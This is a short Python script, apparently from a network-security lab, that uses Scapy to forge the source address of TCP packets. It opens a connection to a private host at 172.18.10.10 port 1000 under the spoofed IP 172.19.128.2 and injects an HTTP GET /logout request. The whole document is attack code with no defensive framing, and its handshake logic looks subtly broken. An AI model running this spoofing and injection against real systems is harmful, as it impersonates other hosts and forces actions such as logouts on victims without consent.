from scapy.all import *

# Define the target IP and port
target_ip = "172.18.10.10"
target_port = 1000

# Spoofed IP address
spoofed_ip = "172.19.128.2"  # Change this to your desired spoofed IP

# Craft the IP packet
ip = IP(src=spoofed_ip, dst=target_ip)

# Craft the TCP packet
tcp = TCP(sport=RandShort(), dport=target_port, flags="S")

# Send the SYN packet to initiate the TCP connection
syn_packet = ip/tcp
syn_ack = sr1(syn_packet)

# Craft the HTTP GET request
http_request = f"GET /logout HTTP/1.1\r\n" \
                f"Host: {target_ip}:{target_port}\r\n" \
                f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9," \
                f"image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\n" \
                f"Accept-Encoding: gzip, deflate\r\n" \
                f"Accept-Language: en-GB,en;q=0.9,te;q=0.8\r\n" \
                f"Connection: keep-alive\r\n" \
                f"Upgrade-Insecure-Requests: 1\r\n\r\n"

# Craft the TCP packet for HTTP request
tcp = TCP(sport=syn_ack.dport, dport=target_port, flags="PA", seq=syn_ack.ack, ack=syn_ack.seq)

# Send the HTTP GET request
http_packet = ip/tcp/http_request
send(http_packet)
